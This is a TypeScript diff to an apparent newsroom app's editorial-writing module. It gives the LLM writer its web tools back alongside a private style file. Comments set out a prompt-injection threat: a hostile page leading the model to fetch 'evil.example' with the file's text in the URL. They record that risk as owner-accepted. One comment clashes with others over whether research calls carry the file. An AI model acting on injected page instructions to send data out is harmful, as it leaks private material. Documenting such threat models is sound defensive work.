@@ -1,6 +1,6 @@
 import { ensureSchemaOnce, getSql, withTransaction } from "../db.ts";
 import { claudeCodeChat } from "./ai-claude-code.server.ts";
-import { grokChat, probeProvider } from "./ai.ts";
+import { grokChat, probeProvider, type LocalModelOverride } from "./ai.ts";
 import { runPinnedCallWithFailover } from "./desk-model-run.ts";
 import {
   orchestrateEditorial,
@@ -12,8 +12,25 @@ import {
 import { findVoiceFile, readVoiceTextForLocalModel } from "./voice.server.ts";
 import { sanitizeJsonLeaves, storableText } from "./storable-text.ts";
 import { getPaperConfig } from "./paper-settings.ts";
-import { modelChoiceLabel, opinionModelChoice, OPINION_AUTOMATIC_LADDER } from "./model-choice.ts";
-import { setJobFailoverNote, setJobModelRuntime, setJobStage, waitForModel } from "./jobs.ts";
+import {
+  modelChoiceLabel,
+  opinionModelChoice,
+  OPINION_AUTOMATIC_LADDER,
+  type OpinionModelChoice,
+} from "./model-choice.ts";
+import {
+  progressReporterFor,
+  setJobFailoverNote,
+  setJobModelRuntime,
+  setJobStage,
+  throwIfJobCancelled,
+  waitForModel,
+} from "./jobs.ts";
+import {
+  runDeskResearch,
+  type DeskResearchDeps,
+  type DeskResearchOutcome,
+} from "./editorial-research.server.ts";
 import {
   persistEditorialCompletion,
   persistEditorialSuccess,
@@ -31,20 +48,43 @@ import { modelEffort, plannerModelFor, providerEntry, providerModel } from "./pr
 import { failoverNoteSentence, failoverReasonPhrase } from "./automatic-failover.ts";
 import { nameCheckText, type NameCheck } from "./name-check.ts";
 import { officialDomains } from "./absence-gate.ts";
+import { officialSiteHost } from "./research-scope.ts";
 import { opinionFallbackRuntimeReceipt } from "./opinion-runtime-receipt.ts";
+import { firstReadyOpinionRung } from "./opinion-readiness.ts";
 import { pinnedLocalModelForJob } from "./job-local-model.ts";
 
 export type { WriteEditorialInput, WriteEditorialResult } from "./editorial-orchestration.ts";
 
-/** Research supplies leads; the writer files an editorial with claims and
- * sources from the record research returned. The gathering pass is the only
- * Claude call that gets the web tools (`EDITORIAL_TOOLS`); the writing call
- * gets none, because it is the one call whose context holds the private voice
- * file AND text gathered from untrusted pages — and an outbound fetch tool
- * reachable from that context would let a hostile page read the voice out
- * through a URL (SEC-3). Research is where web access belongs: it never sees
- * the voice. Both CLIs load the complete voice by file path, never as prompt
- * text in argv or application logs. */
+/** Research supplies leads; the writer independently opens sources and files an
+ * editorial with claims and sources. Both subscription writers retain web
+ * research during writing — the voice file CONTAINS the research protocol
+ * (Stage L local record, packet/PDF/tape/parcel/CORA rules, triangulation, the
+ * surprise hunt, the local source ledger), so a writer given the voice and
+ * denied the tools cannot run the protocol it was told to run. Both CLIs load
+ * the complete voice by file path, never as prompt text in argv or application
+ * logs.
+ *
+ * UNIT U31 RESTORED THAT, and recorded what it costs. Units U12/U12b/c split
+ * the pair — a gathering pass with the tools and no voice, a writing pass with
+ * the voice and no tools — to close a real exfiltration path (a prompt-injected
+ * page inducing a fetch that carries style-guide text out of the machine).
+ * The owner weighed that against an editorial writer that cannot follow its own
+ * research protocol and chose the writer: SEC-3 is now an owner-accepted risk,
+ * stated in SECURITY.md, not a guard the tests hold. See `runClaudePair` and
+ * `runCodexPair` for the restored shapes, and `git show 992fef1c^:` for the
+ * exact code they were restored from.
+ *
+ * There is also a ONE-PASS-WRITING pair, for the writers with no tool loop at
+ * all: the "Local model" pick, Automatic's DeepSeek v4.1 Flash rung, and the
+ * newsroom's saved connections, which speak the OpenAI-compatible protocol over
+ * HTTP. It makes a single WRITING call — the voice as the system message, never
+ * an argument — but it is not unresearched (units U30 + U31): the desk runs a
+ * research pass of its own first, holding the same voice file so the protocol
+ * governs the planning and the selection too, and the model reads the desk's
+ * captures back as findings. The writing pack says what research ran, with each
+ * capture's URL and capture id. Which pair a candidate takes is read from the
+ * registry entry's `kind` (via `providerRunsToolPass`), not from its id; see
+ * `orchestrateEditorial`'s `runPair`. */
 
 /**
  * Editorials take tens of minutes, not seconds. The voice researches first.
@@ -123,6 +163,14 @@ export type EditorialWriterDeps = {
   claudeCodeChat?: typeof claudeCodeChat;
   codexChat?: typeof import("./ai-codex.server.ts").codexChat;
   /**
+   * Test seam for the one-pass OpenAI-compatible transport (the Local model
+   * pick and Automatic's DeepSeek v4.1 Flash rung). It is the call that
+   * carries the private voice as its system message, so a test can assert
+   * that shape -- voice as system text, no tools, the rung's own endpoint --
+   * without a socket or a spend.
+   */
+  grokChat?: typeof grokChat;
+  /**
    * Test seam: the availability answer the Claude pair reads before it spends
    * anything. Production asks the operator's own switch through
    * `resolveClaudeCode` (./ai.ts).
@@ -134,6 +182,21 @@ export type EditorialWriterDeps = {
    * transport a test recorded. The environment is not the test's to assume.
    */
   resolveClaudeCode?: typeof import("./ai.ts").resolveClaudeCode;
+  /**
+   * Test seam for the desk-run research pass (unit U30): its search, its page
+   * fetch, its capture write, its two model calls, the newsroom's research
+   * window, the Stop seam and the stage reporter. Production passes nothing and
+   * every piece of it reaches the real thing -- `searchWithFallback`,
+   * `ingestDocument`, `rememberCapture`, `grokChat`, `throwIfJobCancelled`.
+   *
+   * The model calls are the reason it is one object rather than six fields on
+   * this type: a test that wants the desk pass to run without a socket fakes
+   * the search and the fetch, and a test that wants to watch every call the
+   * piece makes leaves `plan`/`read` alone so they arrive through `grokChat`
+   * alongside the writing call -- which is how SEC-3 is asserted (the research
+   * calls must not carry the voice, and the writing call must not carry tools).
+   */
+  deskResearch?: DeskResearchDeps;
 };
 
 export async function writeEditorial(
@@ -146,6 +209,7 @@ export async function writeEditorial(
     paper: {
       name: cfg.name,
       city: cfg.city,
+      state: cfg.state,
       officialDomains: officialDomains(
         cfg.city,
         input.pointers.map((pointer) => pointer.url),
@@ -156,6 +220,103 @@ export async function writeEditorial(
   // technical failure, a fallback writer receives this saved research text
   // instead of repeating the searches and source opens already completed.
   let completedResearch: string | null = null;
+  /*
+    The desk's own research, memoized for exactly the same reason (unit U30):
+    the ladder can move a no-tool piece from DeepSeek to another no-tool rung,
+    and the second rung must receive what the desk already found rather than pay
+    for the same searches and page opens a second time.
+  */
+  let completedDeskResearch: DeskResearchOutcome | null = null;
+  /*
+    The city's own site, read once for the desk pass's planner and its relevance
+    ranking -- the same read the dig makes for its `site:` strategies (see
+    ./research-scope.ts's `officialSiteHost`). Null when the newsroom has no
+    official seed source, which yields no official host rather than a
+    neighbouring jurisdiction's.
+  */
+  const paperOfficialHost = officialSiteHost(cfg.city, cfg.seedSources, cfg.state);
+  /**
+   * How this piece announces a stage.
+   *
+   * One reporter for the whole run, so a stage sentence and the card's chip
+   * row can never disagree: `input.onStage` is the job row's own
+   * `progressReporterFor` when this is a queued run (see
+   * `performEditorialWork`), which sets the stage INDEX as well as the
+   * sentence. A direct call -- a test, a write assembled by hand -- falls back
+   * to the id-only `setJobStage`, or to nothing at all when there is no job.
+   */
+  const reportStage = (editorialInput: WriteEditorialInput) => async (stage: string) => {
+    if (editorialInput.onStage) return editorialInput.onStage(stage);
+    if (editorialInput.completion) await setJobStage(editorialInput.completion.jobId, stage);
+  };
+
+  /**
+   * The desk's research pass, run once per piece for a writer that has no web
+   * tools of its own (units U30 + U31).
+   *
+   * `chat` is the same no-tool transport the writing call uses, so the model
+   * that plans the searches and the model that reads the desk's records are the
+   * rung the editor picked. `voice` is the operator's voice file, and since U31
+   * it is the SYSTEM MESSAGE of both research calls exactly as it is of the
+   * writing call: the voice contains the research protocol, so a plan made
+   * without it is a plan made without the protocol. A test records all three
+   * calls of a piece through one `grokChat` seam, which is how "the research
+   * holds the voice" is asserted rather than assumed.
+   */
+  const deskResearchFor = async (
+    editorialInput: WriteEditorialInput,
+    researchPack: string,
+    voice: string,
+    chat: typeof grokChat,
+    options: { choice: OpinionModelChoice; localModel?: LocalModelOverride; exactModel?: string },
+  ): Promise<DeskResearchOutcome> => {
+    if (completedDeskResearch) return completedDeskResearch;
+    const callOptions = {
+      choice: options.choice,
+      newsroomId: editorialInput.newsroomId,
+      timeoutMs: editorialTimeoutMs(),
+      ...(options.localModel ? { localModel: options.localModel } : {}),
+      reasoningEffort: modelEffort(options.choice, editorialInput.modelEffort, options.exactModel),
+    };
+    completedDeskResearch = await runDeskResearch(
+      {
+        userId: editorialInput.userId,
+        newsroomId: editorialInput.newsroomId,
+        subject: editorialInput.subject,
+        askedFor: editorialInput.askedFor,
+        voice,
+        researchPack,
+        paper: {
+          city: editorialInput.paper?.city,
+          state: editorialInput.paper?.state,
+          officialDomains: editorialInput.paper?.officialDomains,
+          // The city's own site, from the newsroom's settings -- the same read
+          // the dig makes for its `site:` strategies. `input.paper` carries
+          // only the .gov hosts derived from the editor's pointers, and an
+          // editor's pointers are usually not on one, so without this the desk
+          // would have no official host to rank first or to name to the planner.
+          officialHosts: paperOfficialHost ? [paperOfficialHost] : [],
+        },
+        requestId: editorialInput.completion?.requestId ?? null,
+      },
+      {
+        ...deps.deskResearch,
+        plan: deps.deskResearch?.plan ?? ((system, user) => chat(system, user, 1_200, callOptions)),
+        read: deps.deskResearch?.read ?? ((system, user) => chat(system, user, 4_000, callOptions)),
+        onStage: deps.deskResearch?.onStage ?? reportStage(editorialInput),
+        throwIfCancelled:
+          deps.deskResearch?.throwIfCancelled ??
+          (async () => {
+            // The U25 Stop seam, asked between searches and between pages. It
+            // throws, so a stopped run leaves the hop loop and no writing call
+            // is ever made -- which is the whole point of asking.
+            if (editorialInput.completion) await throwIfJobCancelled(editorialInput.completion.jobId);
+          }),
+      },
+    );
+    return completedDeskResearch;
+  };
+
   return orchestrateEditorial(input, {
     findVoiceFile,
     runClaudePair: async ({ input: editorialInput, found, researchPack }) => {
@@ -185,23 +346,31 @@ export async function writeEditorial(
         if (!research.ok) return research;
         completedResearch = research.text;
       }
-      if (editorialInput.completion)
-        await setJobStage(editorialInput.completion.jobId, "Writing the editorial");
+      await reportStage(editorialInput)("Writing the editorial");
       return chat({
         system: "",
         systemPromptFile: found.voice.path,
         /*
-          No tools here, and no empty allow-list either. This is the one call
-          whose context holds the operator's private voice file AND the
-          gathering pass's summary of untrusted pages, so it must have no way
-          to reach the network: a page that talked the writer into
-          `WebFetch https://evil.example/?d=<voice or draft>` would publish
-          the voice by URL. `noTools` drops the tool surface from the request
-          (`--tools ""`) rather than pre-denying a visible one, so there is
-          nothing live to try. Web access stays on the research call above,
-          which never sees the voice (SEC-3).
+          UNIT U31 -- THE WRITER RESEARCHES AND WRITES IN ONE RUN.
+
+          Restored from before U12 (`git show 992fef1c^:src/lib/news/
+          editorial.server.ts`): this call holds the operator's voice file by
+          path AND the web tools, exactly as it did then. The reason is in the
+          file itself -- the voice contains the research protocol (Stage L
+          local record, packet/PDF/tape/parcel/CORA rules, triangulation, the
+          surprise hunt, the local source ledger) -- so a writer given the
+          voice but denied the tools cannot run the protocol it was told to
+          run, and a gathering pass denied the voice researches without it.
+
+          SEC-3 is now an owner-accepted risk, recorded in SECURITY.md: a
+          prompt-injected page could in principle induce a fetch carrying
+          style-guide text. The owner accepted that for a single-person
+          newsroom over a writer that cannot follow its own protocol.
+          Everything else stays: the voice is never an argument and never
+          logged (see `voice.server.ts`), and the path is validated before it
+          is read.
         */
-        noTools: true,
+        allowedTools: EDITORIAL_TOOLS,
         user: buildWritingPack({
           paper: editorialInput.paper,
           subject: editorialInput.subject,
@@ -233,11 +402,23 @@ export async function writeEditorial(
         if (!research.ok) return research;
         completedResearch = research.text;
       }
-      if (editorialInput.completion)
-        await setJobStage(editorialInput.completion.jobId, "Writing the editorial");
+      await reportStage(editorialInput)("Writing the editorial");
       return codexChat({
         system: "",
         systemPromptFile: found.voice.path,
+        /*
+          UNIT U31 -- the writer gets its web search back (U12b took it away).
+
+          U12b passed `--disable standalone_web_search` here so the writing
+          call could not search. That is the capability the voice's research
+          protocol needs, so it is asked for again -- and asked for BY NAME
+          rather than left to the CLI: before U12 this call named nothing at
+          all and inherited codex-cli 0.145.0's own default, which is `false`
+          for `standalone_web_search`. Stating `webSearch: true` is what makes
+          the restored capability a property a test can hold instead of a
+          default the installed CLI is free to change.
+        */
+        webSearch: true,
         user: buildWritingPack({
           paper: editorialInput.paper,
           subject: editorialInput.subject,
@@ -251,65 +432,137 @@ export async function writeEditorial(
       });
     },
     /*
-      The Local model pair. Unlike the Claude Code CLI, a local server has no
-      WebSearch/WebFetch tool loop to run a separate gathering pass with (see
-      EDITORIAL_TOOLS), so this is one call: it writes straight from the
-      editor's own pointers via `buildWritingPack({ research: "" })`, which
-      renders the honest "the gathering pass found nothing usable" note
-      rather than pretending research happened. It has no `--system-prompt-
-      file` equivalent either, so the voice travels as an ordinary system
-      string through `readVoiceTextForLocalModel` -- the same destination-
-      named-authorization idea voice.server.ts's other text export used for a
-      withdrawn provider path, scoped to this one call site.
+      The one-pass-writing pair: every OpenAI-compatible writer Opinion's ladder
+      can land on -- the "Local model" pick, and Automatic's DeepSeek v4.1 Flash
+      rung (units U29 + U30). Unlike the Claude Code CLI, an Ollama / llama.cpp
+      server has no WebSearch/WebFetch tool loop for THE MODEL to run a
+      gathering pass with (see EDITORIAL_TOOLS). Since U30 that is not the same
+      as "no research": the DESK runs its own bounded pass first
+      (./editorial-research.server.ts -- searches, page opens and captures
+      through the machinery the Dark Desk uses) and this pair still makes the
+      one WRITING call: the voice as the system instructions, no tools, from
+      the desk's record. It has no `--system-prompt-file` equivalent either, so
+      the voice travels as an ordinary system string through
+      `readVoiceTextForLocalModel` -- the same destination-named-authorization
+      idea voice.server.ts's other text export used for a withdrawn provider
+      path, scoped to this call site. The voice is never an argument and
+      is never logged; it goes in the request body's system message.
+
+      Which endpoint and model: the registry entry decides. "Local model"
+      carries the editor's own per-newsroom server/model pick (see
+      ./provider-settings.ts's `resolveLocalModelChoice`), while a rung such
+      as DeepSeek carries its endpoint in the registry (`rungGateway`), so it
+      never reads LLM_BASE_URL and cannot be sent to the editor's local pick
+      by accident.
     */
-    runLocalPair: async ({ input: editorialInput }) => {
+    runLocalPair: async ({ input: editorialInput, researchPack }) => {
       const voice = await readVoiceTextForLocalModel();
       if (!voice.ok) return voice;
-      const { grokChat } = await import("./ai.ts");
+      const choice = opinionModelChoice(editorialInput.modelChoice);
+      const entry = providerEntry(choice);
+      if (!entry || (entry.kind !== "local" && entry.kind !== "openai")) {
+        // Unreachable through `runPair`, which dispatches on the same field --
+        // but a runtime assembled by hand must not silently write on Claude.
+        return { ok: false, error: "The selected local model is unavailable." };
+      }
+      const isLocalPick = entry.id === "local-model";
       // Same per-newsroom "which local server/model" pick every other
       // surface honours (Story, Scan, Dark Desk) -- see
       // ./provider-settings.ts's `resolveLocalModelChoice`. Failure here
       // (no database, discovery unreachable) falls back to the env-only
       // resolution `localGateway()` already does, exactly as before this
       // wiring existed.
-      const localModel = editorialInput.localModel ?? await import("./provider-settings.ts")
-        .then((m) => m.resolveLocalModelChoice(editorialInput.newsroomId, "opinion"))
-        .then((r) => r.override)
-        .catch(() => undefined);
-      return grokChat(
+      const localModel = isLocalPick
+        ? editorialInput.localModel ?? await import("./provider-settings.ts")
+          .then((m) => m.resolveLocalModelChoice(editorialInput.newsroomId, "opinion"))
+          .then((r) => r.override)
+          .catch(() => undefined)
+        : undefined;
+      // The exact model this call is sent to, which is what an effort level
+      // is validated against: the resolved local pick, or the rung's own
+      // registry model (DeepSeek v4.1 Flash declares off/low/high/max).
+      const exactModel = isLocalPick ? localModel?.id : providerModel(entry);
+      const { grokChat } = await import("./ai.ts");
+      const chat = deps.grokChat ?? grokChat;
+      /*
+        UNIT U30 -- THE DESK RESEARCHES FOR THIS WRITER.
+
+        It runs HERE, before the voice is handed to the writing call, and its
+        two model calls are the same no-tool transport: the provider that plans
+        the queries and reads the captures is the rung the editor picked. Neither
+        of those calls is given the voice, and the transport underneath them has
+        no tool surface to give the web to, so SEC-3 holds on both sides -- the
+        pass with the web never held the voice, and the pass with the voice never
+        had a web tool (unit U29's property, kept).
+
+        What the editor is owed instead is the truth about the pass, and the run
+        says it: the desk searched and read, and the writing pack carries the
+        counts, the captures' URLs and their capture ids.
+      */
+      const desk = await deskResearchFor(editorialInput, researchPack, voice.text, chat, {
+        choice,
+        ...(localModel ? { localModel } : {}),
+        exactModel,
+      });
+      await reportStage(editorialInput)("Writing the editorial");
+      return chat(
         voice.text,
         buildWritingPack({
           paper: editorialInput.paper,
           subject: editorialInput.subject,
           ourStory: editorialInput.ourStory,
           askedFor: editorialInput.askedFor,
-          research: editorialInput.sourceText ?? "",
+          research: desk.findings,
+          suppliedMaterial: editorialInput.sourceText,
+          deskResearch: {
+            searches: desk.searches,
+            pages: desk.pages,
+            captures: desk.captures,
+            window: desk.window,
+          },
         }),
         4_000,
         {
           timeoutMs: editorialTimeoutMs(),
-          choice: "local-model",
-          localModel,
-          reasoningEffort: modelEffort(
-            "local-model",
-            editorialInput.modelEffort,
-            localModel?.id,
-          ),
+          choice,
+          ...(localModel ? { localModel } : {}),
+          reasoningEffort: modelEffort(choice, editorialInput.modelEffort, exactModel),
         },
       );
     },
-    runCustomPair: async ({ input: editorialInput }) => {
+    /*
+      A saved connection is an OpenAI-compatible endpoint too, so it has no tool
+      loop either and gets the same desk-run research the local pair does (unit
+      U30). Before U30 this pair handed the writing pack no research record at
+      all and so fell through to the two-pass wording -- "by a separate pass
+      that searched and opened public sources before you" -- which was never
+      true of a custom connection. Now the pack describes the pass that actually
+      ran, under the same voice (unit U31).
+    */
+    runCustomPair: async ({ input: editorialInput, researchPack }) => {
       const voice = await readVoiceTextForLocalModel();
       if (!voice.ok) return voice;
       const { grokChat } = await import("./ai.ts");
-      return grokChat(
+      const chat = deps.grokChat ?? grokChat;
+      const desk = await deskResearchFor(editorialInput, researchPack, voice.text, chat, {
+        choice: opinionModelChoice(editorialInput.modelChoice),
+      });
+      await reportStage(editorialInput)("Writing the editorial");
+      return chat(
         voice.text,
         buildWritingPack({
           paper: editorialInput.paper,
           subject: editorialInput.subject,
           ourStory: editorialInput.ourStory,
           askedFor: editorialInput.askedFor,
-          research: editorialInput.sourceText ?? "",
+          research: desk.findings,
+          suppliedMaterial: editorialInput.sourceText,
+          deskResearch: {
+            searches: desk.searches,
+            pages: desk.pages,
+            captures: desk.captures,
+            window: desk.window,
+          },
         }),
         4_000,
         {
@@ -736,7 +989,40 @@ export async function performEditorialWork(
     jobReceipt.requestedEffort ?? jobReceipt.modelEffort,
   );
   const currentChoice = opinionModelChoice(req.model_choice);
-  let activeChoice = (currentChoice === "auto" ? OPINION_AUTOMATIC_LADDER[0] : currentChoice) as EffectiveOpinionModelChoice;
+  /* The one probe this job uses, for the ladder walk below and for the
+     document pass's own routing -- so a queued local model is verified
+     against the same endpoint both places ask about. */
+  const probeOpinion = (choice?: string) =>
+    (deps.documentProbe ?? probeProvider)(
+      choice,
+      job.newsroom_id,
+      undefined,
+      "opinion",
+      queuedLocalModel ?? undefined,
+    );
+  /*
+    Which rung an Automatic request starts on.
+
+    `OPINION_AUTOMATIC_LADDER[0]` used to be right by construction: rank 1 was
+    Codex Sol, a subscription the editor has been told to sign in to. Unit U29
+    put DeepSeek v4.1 Flash -- an Ollama endpoint this machine may simply not
+    have -- at the head of that ladder, and the first thing this job does with
+    its start choice is PROBE it (the document pass below). A desk with no
+    Ollama server would begin every Automatic editorial on a rung that cannot
+    answer.
+
+    So Automatic is RESOLVED here, the way every other surface resolves it:
+    walk the ladder in registry order and start on the first rung that
+    answers. When none does, the head is kept and the document pass reports
+    the probe's own reason -- the same sentence the editor saw at commit time,
+    rather than a new one invented here.
+  */
+  const resolvedRung =
+    currentChoice === "auto"
+      ? await firstReadyOpinionRung((rung) => probeOpinion(rung))
+      : null;
+  let activeChoice: EffectiveOpinionModelChoice =
+    resolvedRung ?? (currentChoice === "auto" ? OPINION_AUTOMATIC_LADDER[0]! : currentChoice);
   let activeEffort = modelEffort(activeChoice, jobReceipt.modelEffort);
   try {
     documentEvidence = await readEditorialDocuments(
@@ -750,7 +1036,7 @@ export async function performEditorialWork(
           modelEffort: activeEffort,
           source: requestedChoice === "auto" ? "auto" : (job.model_choice_source ?? "editor"),
           ladder: OPINION_AUTOMATIC_LADDER,
-          probe: (choice) => (deps.documentProbe ?? probeProvider)(choice, job.newsroom_id, undefined, "opinion", queuedLocalModel ?? undefined),
+          probe: probeOpinion,
           localModel: queuedLocalModel ?? undefined,
           chat: deps.documentChat,
           onSwitch: async ({ previousLabel, nextLabel, nextChoice, nextEffort, reason }) => {
@@ -800,6 +1086,15 @@ export async function performEditorialWork(
         requestedModelEffort: requestedEffort,
         completion: { requestId: req.id, jobId: job.id },
         localModel: queuedLocalModel ?? undefined,
+        /*
+          The FB1 stage reporter, bound to the row this worker claimed. It is
+          the only place the row's stage LIST is in scope, so it is the only
+          place a stage sentence can be turned into a chip index -- see
+          `progressReporterFor`. The desk research pass (unit U30) is the
+          newest caller: "Researching with the desk" is an arrival in
+          `JOB_STAGE_LISTS.editorial`, and this is what lights it.
+        */
+        onStage: progressReporterFor(job as Pick<import("./jobs.ts").DeskJob, "id" | "stages_json">),
       }),
   });
 
